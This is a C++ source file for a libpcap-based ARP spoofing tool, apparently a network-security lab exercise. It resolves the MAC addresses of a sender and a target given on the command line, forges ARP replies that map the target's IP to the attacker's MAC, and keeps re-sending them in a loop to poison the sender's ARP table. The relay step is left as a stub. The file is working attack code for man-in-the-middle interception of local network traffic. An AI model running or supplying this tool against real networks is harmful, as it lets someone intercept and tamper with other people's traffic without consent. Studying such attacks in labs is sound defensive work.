#include "main.h"

void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt)
{
	struct pcap_pkthdr *header;
	const u_char *packet;
	while(true)
	{
		int result = pcap_next_ex(handle, &header, &packet);
		if (result == 0)
			continue;
		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
			break;
		}
		if (/*Reinfection function*/true)
			sendArp(handle, pkt);
		// else
			/*relay function*/
	}
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc-1; iter += 2)
	{
		printf("\n----------------------------------------\n");
		printf("[*] send-arp #%d..",iter/2);
		printf("\n----------------------------------------\n");

		char *dev = argv[1];
		const char *interfaceName = argv[1];
		
		Ip attackerIp;
		Mac attackerMac;
		
		getHostInfo(interfaceName, &attackerIp, &attackerMac);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		printf("\n----------------------------------------\n");
		printf("[*] get sender Info..");
		printf("\n----------------------------------------\n");

		Ip senderIp = Ip(argv[iter]);
		Mac senderMac = getMac(handle, attackerIp, attackerMac, senderIp);
		printf("[+] senderIp    : %s\n", std::string(senderIp).c_str());
		printf("[+] senderMac   : %s\n", std::string(senderMac).c_str());

		printf("\n----------------------------------------\n");
		printf("[*] get target Info..");
		printf("\n----------------------------------------\n");

		Ip targetIp = Ip(argv[iter+1]);
		Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
		printf("[+] targetIp    : %s\n", std::string(targetIp).c_str());
		printf("[+] targetMac   : %s\n", std::string(targetMac).c_str());
		

		// Send ARP Reply packet to infect sender's ARP table
		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp);
		sendArp(handle, pkt);

		std::thread sendArpThread(continueSendArp, handle, 10);

		while (true)
		{
			spoofProcess(ArpHdr::Reply, handle, pkt);
		}
		sendArpThread.detach();


		pcap_close(handle);
	}
}
